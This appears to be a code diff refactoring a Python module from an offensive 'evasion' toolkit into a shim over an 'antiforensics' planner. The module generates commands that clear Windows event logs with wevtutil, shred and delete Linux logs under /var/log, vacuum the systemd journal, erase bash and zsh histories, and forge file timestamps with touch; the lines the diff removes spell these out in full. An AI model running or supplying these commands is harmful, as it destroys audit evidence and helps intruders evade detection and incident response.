@@ -1,3 +1,13 @@
+"""orchestrator.evasion.log_wiping — compatibility shim.
+
+The original module exposed raw command dictionaries. Those are preserved for
+callers that still import them, but the canonical planner is now
+`orchestrator.evasion.antiforensics`.
+"""
+from __future__ import annotations
+
+from .antiforensics import AntiforensicsStep, log_wipe
+
 LOG_PATHS = {
     "windows": {
         "security": "wevtutil cl Security",
@@ -19,47 +29,32 @@ LOG_PATHS = {
 }
 
 
-def get_wipe_commands(platform: str = "linux", targeted: list[str] = None) -> list[str]:
+def get_wipe_commands(platform: str = "linux", targeted: list[str] | None = None) -> list[str]:
     logs = LOG_PATHS.get(platform, {})
     if targeted:
         return [v for k, v in logs.items() if k in targeted]
     return list(logs.values())
 
 
-def wipe_script(platform: str = "linux", exclude: list[str] = None) -> str:
+def wipe_script(platform: str = "linux", exclude: list[str] | None = None) -> str:
     commands = get_wipe_commands(platform)
     if exclude:
         commands = [c for c in commands if not any(e in c for e in exclude)]
-    script = ""
-    for cmd in commands:
-        if platform == "linux":
-            script += f"if command -v {' '.join(cmd.split()[:1])} 2>/dev/null; then {cmd}; fi\n"
-        else:
-            script += f"{cmd} 2>$null\n"
-    return script
+    return "\n".join(commands) + "\n"
 
 
 def timestamp_jammer(target_file: str = "", new_ts: str = "") -> str:
+    from .timestomp import plan_timestomp
     if not target_file:
         return ""
-    import random
-    import datetime
-    ts = new_ts or datetime.datetime.now().strftime("%Y%m%d%H%M.%S")
-    return f"touch -t {ts} {target_file}"
+    return plan_timestomp(target_file, timestamp=new_ts or None).command
 
 
 def event_log_wipe_recon(platform: str = "windows") -> str:
-    if platform == "windows":
-        return (
-            '@( "Security", "System", "Application", "Windows PowerShell", '
-            '"Microsoft-Windows-PowerShell/Operational", '
-            '"Microsoft-Windows-WMI-Activity/Operational", "Setup" ) | '
-            'ForEach-Object { wevtutil cl $_ 2>$null }'
-        )
-    return (
-        'for log in syslog auth.log kern.log lastlog wtmp btmp messages; do '
-        'shred -z /var/log/$log 2>/dev/null; rm -f /var/log/$log; done; '
-        'journalctl --rotate --vacuum-time=1s 2>/dev/null; '
-        'rm -rf ~/.bash_history ~/.zsh_history 2>/dev/null; '
-        'history -c 2>/dev/null'
-    )
+    return "\n".join(s.command for s in log_wipe(platform=platform)) + "\n"
+
+
+__all__ = [
+    "LOG_PATHS", "AntiforensicsStep", "log_wipe", "get_wipe_commands",
+    "wipe_script", "timestamp_jammer", "event_log_wipe_recon",
+]
